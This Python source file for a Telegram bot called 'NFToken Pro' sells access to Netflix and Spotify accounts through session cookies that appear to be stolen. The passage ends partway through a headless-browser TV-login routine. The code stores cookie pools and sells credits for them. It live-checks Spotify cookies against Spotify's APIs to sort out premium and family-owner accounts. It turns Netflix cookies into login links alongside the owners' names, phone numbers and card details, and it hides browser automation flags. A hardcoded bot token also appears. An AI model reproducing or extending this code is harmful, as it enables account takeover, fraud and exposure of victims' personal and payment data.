#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║   NETFLIX NFTOKEN PRO — PREMIUM BOT      ║
║   Cookie → NFToken Link Generator        ║
║   Multi-Endpoint | Auto-Fallback           ║
╚══════════════════════════════════════════╝
"""

import logging
import requests
import json
import re
import zipfile
import io
import time
import asyncio
import random
import sqlite3
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# ══════════════════════════════════════════
#  DATABASE FUNCTIONS (TỰ ĐỘNG TẠO DB)
# ══════════════════════════════════════════
ADMIN_ID = 5992662564 # ID ADMIN CỦA BẠN

def get_connection():
    return sqlite3.connect('bot_database.db', check_same_thread=False)

def init_db():
    conn = get_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 0, 
                  credits INTEGER DEFAULT 0, plan_name TEXT DEFAULT 'FREE', is_banned INTEGER DEFAULT 0,
                  last_active TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS plans
                 (name TEXT PRIMARY KEY, tokens_max INTEGER, cookies_max INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_cookies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, is_used INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS free_cookies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, is_used INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS store
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price INTEGER, credits INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS discount_codes
                 (code TEXT PRIMARY KEY, amount INTEGER, uses INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, status TEXT DEFAULT 'PENDING')''')
    c.execute('''CREATE TABLE IF NOT EXISTS usage
                 (user_id INTEGER, date TEXT, tokens_used INTEGER DEFAULT 0, free_cookies_used INTEGER DEFAULT 0,
                  PRIMARY KEY(user_id, date))''')
    c.execute('''CREATE TABLE IF NOT EXISTS purchase_history
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, plan_name TEXT, price INTEGER, date TEXT)''')
    c.execute('''INSERT OR IGNORE INTO plans (name, tokens_max, cookies_max) VALUES ('FREE', 0, 0)''')
    
    # THÊM BẢNG CHO SPOTIFY
    c.execute('''CREATE TABLE IF NOT EXISTS spotify_cookies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  json_data TEXT, 
                  email TEXT, 
                  country TEXT, 
                  plan_type TEXT, 
                  is_used INTEGER DEFAULT 0)''')
                  
    conn.commit()
    conn.close()

# ══════════════════════════════════════════
#  SPOTIFY COOKIE PROCESSOR & LIVE CHECKER
# ══════════════════════════════════════════
def process_spotify_cookie_text(text):
    """
    Phân tích file text Spotify để lấy Email, Country và chuyển Netscape sang JSON.
    Không dựa vào Plan trong text nữa vì sẽ dùng LIVE CHECK qua API.
    """
    email_match = re.search(r'[-–]\s*Email:\s*([^\n\r]+)', text)
    email = email_match.group(1).strip() if email_match else "Unknown"

    country_match = re.search(r'[-–]\s*Country:\s*([^\n\r]+)', text)
    country = country_match.group(1).strip() if country_match else "XX"

    lines = text.split('\n')
    json_cookies = []
    for line in lines:
        if line.startswith('#') or not line.strip():
            continue
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            try:
                expiry = parts[4]
                cookie_dict = {
                    "domain": parts[0],
                    "expirationDate": float(expiry) if expiry.replace('.','',1).isdigit() else 253402300799,
                    "hostOnly": not parts[0].startswith('.'),
                    "httpOnly": False,
                    "name": parts[5],
                    "path": parts[2],
                    "sameSite": "unspecified",
                    "secure": parts[3].upper() == 'TRUE',
                    "session": float(expiry) == 0 if expiry.replace('.','',1).isdigit() else False,
                    "storeId": "0",
                    "value": parts[6]
                }
                json_cookies.append(cookie_dict)
            except Exception:
                continue
    
    if not json_cookies:
        return None

    return {
        "email": email,
        "country": country,
        "json_data": json.dumps(json_cookies, indent=4)
    }

async def check_spotify_cookie_live(json_cookies):
    """
    KIỂM TRA SỐNG/CHẾT VÀ GÓI SPOTIFY TRỰC TIẾP QUA API.
    Trả về: (is_live: bool, plan_type: str) -> plan_type có thể là 'PREMIUM' hoặc 'FAMILY_OWNER'
    """
    sp_dc = next((c['value'] for c in json_cookies if c['name'] == 'sp_dc'), None)
    if not sp_dc:
        return False, None

    def fetch():
        try:
            cookies = {'sp_dc': sp_dc}
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            
            # Bước 1: Lấy Token Authorization
            r = requests.get('https://open.spotify.com/get_access_token?reason=transport&productType=web_player', cookies=cookies, headers=headers, timeout=15)
            if r.status_code != 200: 
                return False, None
            
            token = r.json().get('accessToken')
            if not token: 
                return False, None

            auth_headers = {
                'Authorization': f'Bearer {token}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }

            # Bước 2: Call API Check Premium
            r_me = requests.get('https://api.spotify.com/v1/me', headers=auth_headers, timeout=10)
            if r_me.status_code != 200: 
                return False, None
            
            me_data = r_me.json()
            if me_data.get('product') != 'premium': 
                return False, None  # Nếu là gói FREE -> Vứt

            # Bước 3: Đã là Premium, giờ gọi API Family Check xem có phải MASTER (Chủ) không
            actual_plan = 'PREMIUM'
            r_fam = requests.get('https://spclient.wg.spotify.com/family/v1/family/home', headers=auth_headers, timeout=10)
            
            if r_fam.status_code == 200:
                fam_data = r_fam.json()
                # Kiểm tra Role trong cấu trúc trả về
                role = fam_data.get('customRole', fam_data.get('role', '')).upper()
                if role == 'MASTER' or fam_data.get('isMaster') == True:
                    actual_plan = 'FAMILY_OWNER'
                    
            return True, actual_plan
        except Exception as e:
            return False, None

    return await asyncio.to_thread(fetch)

# ══════════════════════════════════════════
#  CÁC HÀM XỬ LÝ KHÁC
# ══════════════════════════════════════════
def get_spotify_cookie_from_db(plan_type):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, json_data, email, country FROM spotify_cookies WHERE is_used=0 AND plan_type=? LIMIT 1", (plan_type,))
    res = c.fetchone()
    if res:
        c.execute("UPDATE spotify_cookies SET is_used=1 WHERE id=?", (res[0],))
        conn.commit()
    conn.close()
    return res

def get_spotify_cookie_count(plan_type=None):
    conn = get_connection()
    c = conn.cursor()
    if plan_type:
        c.execute("SELECT COUNT(*) FROM spotify_cookies WHERE is_used=0 AND plan_type=?", (plan_type,))
    else:
        c.execute("SELECT COUNT(*) FROM spotify_cookies WHERE is_used=0")
    res = c.fetchone()[0]
    conn.close()
    return res

def is_user_banned(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,))
    res = c.fetchone()
    conn.close()
    return res[0] == 1 if res else False

def ban_user(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def get_user(user_id, username):
    conn = get_connection()
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    res = c.fetchone()
    if not res:
        c.execute("INSERT INTO users (user_id, username, last_active) VALUES (?, ?, ?)", (user_id, username, now))
    else:
        c.execute("UPDATE users SET username=?, last_active=? WHERE user_id=?", (username, now, user_id))
    conn.commit()
    conn.close()
    return res

def get_user_economy(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT balance, credits FROM users WHERE user_id=?", (user_id,))
    res = c.fetchone()
    conn.close()
    return res if res else (0, 0)

def get_user_quota(user_id):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT plan_name FROM users WHERE user_id=?", (user_id,))
    plan_res = c.fetchone()
    plan_name = plan_res[0] if plan_res else 'FREE'
    
    c.execute("SELECT tokens_max, cookies_max FROM plans WHERE name=?", (plan_name,))
    p_res = c.fetchone()
    tokens_max, cookies_max = p_res if p_res else (0, 0)
    
    c.execute("SELECT tokens_used, free_cookies_used FROM usage WHERE user_id=? AND date=?", (user_id, date))
    u_res = c.fetchone()
    if not u_res:
        c.execute("INSERT INTO usage (user_id, date) VALUES (?, ?)", (user_id, date))
        conn.commit()
        tokens_used, free_cookies_used = 0, 0
    else:
        tokens_used, free_cookies_used = u_res
    conn.close()
    return tokens_used, tokens_max, free_cookies_used, cookies_max, plan_name

def claim_free_cookie(user_id):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT id, data FROM free_cookies WHERE is_used=0 LIMIT 1")
    cookie = c.fetchone()
    if cookie:
        c.execute("UPDATE free_cookies SET is_used=1 WHERE id=?", (cookie[0],))
        c.execute("UPDATE usage SET free_cookies_used = free_cookies_used + 1 WHERE user_id=? AND date=?", (user_id, date))
        conn.commit()
        conn.close()
        return cookie[1]
    conn.close()
    return None

def get_stats():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE date(last_active) = date('now')")
    active = c.fetchone()[0]
    c.execute("SELECT SUM(tokens_used) FROM usage")
    tokens = c.fetchone()[0] or 0
    c.execute("SELECT COUNT(*) FROM premium_cookies WHERE is_used=0")
    avail = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_cookies WHERE is_used=1")
    used = c.fetchone()[0]
    conn.close()
    return total, active, tokens, avail, used

def set_plan(user_id, plan_name):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT name FROM plans WHERE name=?", (plan_name,))
    if not c.fetchone():
        c.execute("INSERT INTO plans (name, tokens_max, cookies_max) VALUES (?, 9999, 9999)", (plan_name,))
    
    c.execute("UPDATE users SET plan_name=? WHERE user_id=?", (plan_name, user_id))
    conn.commit()
    conn.close()
    return True

def add_plan(name, tokens_max, cookies_max):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO plans (name, tokens_max, cookies_max) VALUES (?, ?, ?)", (name, tokens_max, cookies_max))
    conn.commit()
    conn.close()

def add_free_cookie(cookie):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO free_cookies (data) VALUES (?)", (cookie,))
    conn.commit()
    conn.close()

def add_premium_cookie(cookie):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO premium_cookies (data) VALUES (?)", (cookie,))
    conn.commit()
    conn.close()

def use_discount_code(code, user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT amount, uses FROM discount_codes WHERE code=?", (code,))
    res = c.fetchone()
    if res and res[1] > 0:
        c.execute("UPDATE discount_codes SET uses = uses - 1 WHERE code=?", (code,))
        c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (res[0], user_id))
        conn.commit()
        conn.close()
        return True, res[0]
    conn.close()
    return False, "Mã không hợp lệ hoặc đã hết lượt sử dụng."

def get_store_items():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, name, price, credits FROM store")
    res = c.fetchall()
    conn.close()
    return res

def get_store_item(item_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, name, price, credits FROM store WHERE id=?", (item_id,))
    res = c.fetchone()
    conn.close()
    return res

def deduct_balance(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE user_id=?", (user_id,))
    bal = c.fetchone()[0]
    if bal >= amount:
        c.execute("UPDATE users SET balance = balance - ? WHERE user_id=?", (amount, user_id))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def add_credits(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def deduct_credits(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def add_purchase_history(user_id, plan_name, price):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("INSERT INTO purchase_history (user_id, plan_name, price, date) VALUES (?, ?, ?, ?)", (user_id, plan_name, price, date))
    tx_id = c.lastrowid
    conn.commit()
    conn.close()
    return tx_id

def get_purchase_history(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT plan_name, price, date FROM purchase_history WHERE user_id=? ORDER BY id DESC", (user_id,))
    res = c.fetchall()
    conn.close()
    return res

def get_purchase_by_id(purchase_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, user_id, plan_name, price, date FROM purchase_history WHERE id=?", (purchase_id,))
    res = c.fetchone()
    conn.close()
    return res

def create_transaction(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO transactions (user_id, amount) VALUES (?, ?)", (user_id, amount))
    tx_id = c.lastrowid
    conn.commit()
    conn.close()
    return tx_id

def approve_transaction(tx_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id, amount, status FROM transactions WHERE id=?", (tx_id,))
    res = c.fetchone()
    if res and res[2] == 'PENDING':
        c.execute("UPDATE transactions SET status='APPROVED' WHERE id=?", (tx_id,))
        c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (res[1], res[0]))
        conn.commit()
        conn.close()
        return True, res[0], res[1]
    conn.close()
    return False, None, None

def reject_transaction(tx_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id FROM transactions WHERE id=?", (tx_id,))
    res = c.fetchone()
    uid = res[0] if res else None
    c.execute("UPDATE transactions SET status='REJECTED' WHERE id=?", (tx_id,))
    conn.commit()
    conn.close()
    return uid

def add_store_item(name, price, credits):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO store (name, price, credits) VALUES (?, ?, ?)", (name, price, credits))
    conn.commit()
    conn.close()

def delete_store_item(item_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("DELETE FROM store WHERE id=?", (item_id,))
    conn.commit()
    conn.close()

def get_premium_cookie_count():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM premium_cookies WHERE is_used=0")
    res = c.fetchone()[0]
    conn.close()
    return res

def get_all_premium_cookies():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, data FROM premium_cookies WHERE is_used=0")
    res = c.fetchall()
    conn.close()
    return res

def pop_premium_cookies(count, user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, data FROM premium_cookies WHERE is_used=0 ORDER BY RANDOM() LIMIT ?", (count,))
    cookies = c.fetchall()
    for cookie in cookies:
        c.execute("UPDATE premium_cookies SET is_used=1 WHERE id=?", (cookie[0],))
    conn.commit()
    conn.close()
    return cookies

def return_premium_cookie(c_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE premium_cookies SET is_used=0 WHERE id=?", (c_id,))
    conn.commit()
    conn.close()

def delete_premium_cookie(c_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("DELETE FROM premium_cookies WHERE id=?", (c_id,))
    conn.commit()
    conn.close()

def purge_all_premium_cookies():
    conn = get_connection()
    c = conn.cursor()
    c.execute("DELETE FROM premium_cookies")
    deleted = c.rowcount
    conn.commit()
    conn.close()
    return deleted

def add_token_usage(user_id, count):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d')
    c.execute("UPDATE usage SET tokens_used = tokens_used + ? WHERE user_id=? AND date=?", (count, user_id, date))
    conn.commit()
    conn.close()

def add_discount_code(code, amount, uses):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO discount_codes (code, amount, uses) VALUES (?, ?, ?)", (code, amount, uses))
    conn.commit()
    conn.close()

def get_all_users():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id, username, plan_name, is_banned FROM users ORDER BY last_active DESC")
    res = c.fetchall()
    conn.close()
    return res

def get_banned_users():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_banned=1")
    res = c.fetchall()
    conn.close()
    return res

# ══════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════
TOKEN = "7352828711:AAF4YrJgA_32i0MtzyRzvmgLlCh9wHgV_hE"
MAX_FILE_SIZE = 20 * 1024 * 1024
MAX_RETRIES = 3
RETRY_BACKOFF = 1
REQUEST_TIMEOUT = 30
BOT_VERSION = "4.5 PRO ULTRA"
BOT_NAME = "NFToken Pro"

# ══════════════════════════════════════════
#  STATE & SPAM TRACKING
# ══════════════════════════════════════════
MAINTENANCE_MODE = False
SPAM_TRACKER = {}  
SPAM_LIMIT = 5
SPAM_WINDOW = 3  

async def check_user_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if not user: return False
    user_id = user.id
    
    global MAINTENANCE_MODE
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        msg = update.message or (update.callback_query.message if update.callback_query else None)
        if msg:
            await msg.reply_text("🛠 *Hệ thống đang bảo trì!*\nVui lòng quay lại sau nhé.", parse_mode='Markdown')
        return False

    if is_user_banned(user_id):
        msg = update.message or (update.callback_query.message if update.callback_query else None)
        if msg:
            await msg.reply_text("🚫 *Tài khoản của bạn đã bị KHÓA!*\nVui lòng liên hệ Admin để được hỗ trợ.", parse_mode='Markdown')
        return False
        
    if user_id != ADMIN_ID:
        now = time.time()
        timestamps = SPAM_TRACKER.get(user_id, [])
        timestamps = [ts for ts in timestamps if now - ts < SPAM_WINDOW]
        timestamps.append(now)
        SPAM_TRACKER[user_id] = timestamps
        
        if len(timestamps) > SPAM_LIMIT:
            ban_user(user_id)
            msg = update.message or (update.callback_query.message if update.callback_query else None)
            if msg:
                await msg.reply_text("🚨 *BẠN ĐÃ BỊ AUTO-BAN VÌ SPAM!*\nLiên hệ Admin để mở khóa.", parse_mode='Markdown')
            
            admin_btn = InlineKeyboardMarkup([[InlineKeyboardButton(f"🔓 Mở Khóa ID {user_id}", callback_data=f"admin_unban_{user_id}")]])
            try:
                clean_name = user.first_name.replace("_", "").replace("*", "").replace("`", "").replace("[", "") if user.first_name else "Khách"
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"🚨 *CẢNH BÁO SPAM*\n\nUser ID: `{user_id}` (Name: {clean_name}) vừa bị auto-ban vì nhắn quá nhanh!",
                    parse_mode='Markdown',
                    reply_markup=admin_btn
                )
            except Exception:
                pass
            return False
            
    return True

LOGO = "◆ 𝗡𝗙𝗧𝗼𝗸𝗲𝗻 𝗣𝗿𝗼"
DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"
DIVIDER_THIN = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
FOOTER = f"⚡ {BOT_NAME} v{BOT_VERSION}"

def banner_main(user_id: int, user_name: str, balance: int, credits: int) -> str:
    return (
        f"👋 Chào mừng *{user_name}*,\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID của bạn: `{user_id}`\n"
        f"💰 Số dư: `{balance:,.0f}đ`\n"
        f"💎 Lượt Rút Cookie VIP: `{credits}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👇 Chọn chức năng bên dưới 👇\n"
    )

def banner_result_success() -> str: return f"◈━━━ ✅ 𝗧𝗛𝗔̀𝗡𝗛 𝗖𝗢̂𝗡𝗚 ━━━◈\n"
def banner_result_fail() -> str: return f"◈━━━ ❌ 𝗧𝗛𝗔̂́𝗧 𝗕𝗔̣𝗜 ━━━◈\n"

def banner_batch_done(ok: int, total: int) -> str:
    pct = round(ok / total * 100) if total > 0 else 0
    bar_filled = round(pct / 10)
    bar_empty = 10 - bar_filled
    bar = "█" * bar_filled + "░" * bar_empty
    return (
        f"◈━━━ 📊 𝗞𝗘̂́𝗧 𝗤𝗨𝗔̉ ━━━◈\n\n"
        f"  {bar}  {pct}%\n\n"
        f"  ✅ Thành công:  *{ok}*\n"
        f"  ❌ Thất bại:      *{total - ok}*\n"
        f"  📁 Tổng cộng:   *{total}*\n\n"
        f"  {DIVIDER_THIN}\n"
        f"  {FOOTER}"
    )

def progress_bar(current: int, total: int, ok: int) -> str:
    pct = round(current / total * 100) if total > 0 else 0
    bar_filled = round(pct / 5)
    bar_empty = 20 - bar_filled
    bar = "▓" * bar_filled + "░" * bar_empty
    return (
        f"⏳ *Đang xử lý...*\n\n"
        f"  `[{bar}]` {pct}%\n\n"
        f"  📋 Tiến độ: *{current}* / *{total}*\n"
        f"  ✅ Hoạt động: *{ok}*"
    )

def format_account_card(account: dict, link: str, index: int = 0) -> str:
    def normalize_display(value):
        if isinstance(value, str):
            text = value.strip()
            try:
                text = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), text)
                text = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), text)
                text = text.encode('utf-16', 'surrogatepass').decode('utf-16')
            except Exception: pass
            import html as html_mod
            text = html_mod.unescape(text)
            return text
        if isinstance(value, bool): return 'Có' if value else 'Không'
        if isinstance(value, (int, float)): return str(value)
        if isinstance(value, dict):
            for key in ['value', 'formattedPrice', 'displayValue', 'text', 'label', 'name', 'title', 'localizedName', 'price']:
                if key in value:
                    normalized = normalize_display(value[key])
                    if normalized: return normalized
            if len(value) == 1: return normalize_display(next(iter(value.values())))
            items = [normalize_display(v) for v in value.values() if normalize_display(v)]
            return ', '.join(items) if items else 'N/A'
        if isinstance(value, list):
            items = [normalize_display(v) for v in value if normalize_display(v)]
            return ', '.join(items) if items else 'N/A'
        return 'N/A'

    account_name = normalize_display(account.get('account_name', 'N/A'))
    email_masked = normalize_display(account.get('email_masked', 'N/A'))
    phone = normalize_display(account.get('phone', 'N/A'))
    country = normalize_display(account.get('country', 'N/A'))
    currency = normalize_display(account.get('country_currency', ''))
    status = normalize_display(account.get('membership_status', 'N/A'))
    plan = normalize_display(account.get('plan', 'N/A'))
    plan_price = normalize_display(account.get('plan_price', 'N/A'))
    member_since = normalize_display(account.get('member_since', 'N/A'))
    next_billing = normalize_display(account.get('next_billing', 'N/A'))
    payment_method = normalize_display(account.get('payment_method', 'N/A'))
    cc_type = normalize_display(account.get('cc_type', 'N/A'))
    last4 = normalize_display(account.get('last4', 'N/A'))
    payment_on_hold = normalize_display(account.get('payment_on_hold', 'N/A'))
    video_quality = normalize_display(account.get('video_quality', 'N/A'))
    extra_member = normalize_display(account.get('extra_member', 'N/A'))
    profile_count = normalize_display(account.get('profile_count', 'N/A'))
    profiles = [normalize_display(p) for p in account.get('profiles', []) if normalize_display(p)]

    status_map = {'CURRENT_MEMBER': 'Đang hoạt động', 'FORMER_MEMBER': 'Đã hết hạn', 'ON HOLD': 'Tạm dừng'}
    status_vn = status_map.get(status, status)

    if phone == 'N/A': phone = 'Chưa thiết lập'
    if cc_type == 'N/A' and payment_method != 'N/A':
        pm_lower = payment_method.lower()
        cc_type_map = {
            'cc': 'Credit Card', 'credit_card': 'Credit Card', 'creditcard': 'Credit Card', 'dcb': 'Nhà mạng (DCB)',
            'paypal': 'PayPal', 'gift': 'Gift Card', 'giftcard': 'Gift Card', 'mobilewallet': 'Ví điện tử',
            'itunes': 'iTunes', 'applepay': 'Apple Pay', 'googleplay': 'Google Play', 'googlepay': 'Google Pay',
        }
        cc_type = cc_type_map.get(pm_lower, payment_method)
    elif cc_type == 'N/A': cc_type = 'Không rõ'
    non_card_types = ('mobilewallet', 'dcb', 'paypal', 'gift', 'giftcard', 'itunes', 'applepay', 'googleplay', 'googlepay')
    if last4 == 'N/A':
        if payment_method != 'N/A' and payment_method.lower() in non_card_types: last4 = 'Không có'
        else: last4 = 'Ẩn'
    if account_name == 'N/A': account_name = 'Không rõ'
    if email_masked == 'N/A': email_masked = 'Không rõ'

    profiles_str = ', '.join(profiles) if profiles else 'Không có'
    country_display = f"{country} ({currency})" if currency else country

    if plan_price != 'N/A':
        has_currency = any(c in plan_price for c in '$€£¥₩฿₫₹₱₺₦₪') or any(plan_price.upper().startswith(p) for p in ['THB', 'VND', 'USD', 'EUR', 'GBP', 'ARS', 'CLP', 'COP', 'PEN', 'AED', 'SAR', 'R$', 'C$', 'A$', 'S$', 'HK$', 'NT$', 'RM', 'Rp'])
        price_display = plan_price if has_currency else (f"{currency} {plan_price}" if currency else plan_price)
    else: price_display = 'Không rõ'

    return (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"THÔNG TIN TÀI KHOẢN\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Tên: {account_name}\n"
        f"├ Email: `{email_masked}`\n"
        f"├ Số điện thoại: `{phone}`\n"
        f"├ Quốc gia: {country_display}\n"
        f"└ Trạng thái: {status_vn}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"GÓI CƯỚC & THANH TOÁN\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Gói cước: {plan}\n"
        f"├ Giá: {price_display}\n"
        f"├ Thành viên từ: {member_since}\n"
        f"├ Hóa đơn tiếp theo: {next_billing}\n"
        f"├ Phương thức TT: {payment_method}\n"
        f"├ Loại thẻ: {cc_type}\n"
        f"├ 4 số cuối: {last4}\n"
        f"└ Tạm giữ thanh toán: {payment_on_hold}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"CHI TIẾT DỊCH VỤ\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Chất lượng video: {video_quality}\n"
        f"├ Extra Member: {extra_member}\n"
        f"├ Số Profile: {profile_count}\n"
        f"└ Profiles: {profiles_str}\n\n"
        f"🔗 **Link Đăng Nhập:**\n`{link}`\n\n"
        f"Nếu có lỗi xảy ra, hãy bấm nút Báo lỗi bên dưới:"
    )

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

active_tasks = {}
user_stats = {}

def get_user_stats(user_id: int) -> dict:
    if user_id not in user_stats: user_stats[user_id] = {'total': 0, 'success': 0}
    return user_stats[user_id]

def update_stats(user_id: int, total: int = 0, success: int = 0):
    stats = get_user_stats(user_id)
    stats['total'] += total
    stats['success'] += success

API_ENDPOINTS = ['https://android.prod.ftl.netflix.com/graphql', 'https://ios.prod.ftl.netflix.com/graphql', 'https://android-appboot.netflix.com/graphql']

class ProxyManager:
    def __init__(self):
        self.proxy = None
        self.proxy_enabled = False
        self.proxy_string = None

    def set_proxy(self, proxy_string: str) -> bool:
        try:
            parts = proxy_string.strip().split(':')
            if len(parts) == 2:
                ip, port = parts
                self.proxy = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
                self.proxy_string = proxy_string
                return True
            elif len(parts) == 4:
                ip, port, user, password = parts
                proxy_url = f'http://{user}:{password}@{ip}:{port}'
                self.proxy = {'http': proxy_url, 'https': proxy_url}
                self.proxy_string = proxy_string
                return True
            return False
        except: return False
    def enable(self): self.proxy_enabled = True
    def disable(self): self.proxy_enabled = False
    def get_proxy(self): return self.proxy if self.proxy_enabled else None
    def get_status_icon(self) -> str: return "⚫" if not self.proxy else ("🟢" if self.proxy_enabled else "🔴")
    def get_status_text(self) -> str: return "Chưa thiết lập" if not self.proxy else (f"Tắt · `{self.proxy_string}`" if not self.proxy_enabled else f"Đang bật · `{self.proxy_string}`")

proxy_manager = ProxyManager()

from nftokenne import NetflixTokenChecker
checker = NetflixTokenChecker()

# ══════════════════════════════════════════
#  NETFLIX TV LOGIN
# ══════════════════════════════════════════
def process_tv_login(cookie_dict: dict, tv_code: str) -> Tuple[bool, str, dict]:
    import os
    import tempfile
    import shutil
    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.common.action_chains import ActionChains
    except ImportError:
        return False, "Máy chủ chưa cài thư viện. Chạy lệnh: pip install selenium", {}

    driver = None
    temp_dir = tempfile.mkdtemp() 
    
    try:
        options = Options()
        options.add_argument('--headless=new') 
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--window-size=1280,720')
        options.add_argument(f'--user-data-dir={temp_dir}')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36')
        
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        bin_path = "/data/data/com.termux/files/usr/bin/chromium-browser"
        if not os.path.exists(bin_path):
            bin_path = "/data/data/com.termux/files/usr/bin/chromium"
            
        driver_path = "/data/data/com.termux/files/usr/bin/chromedriver"
        
        if not os.path.exists(driver_path) or not os.path.exists(bin_path):
            return False, "Không tìm thấy Chromium. Hãy chạy lệnh: pkg install chromium -y", {}

        options.binary_location = bin_path
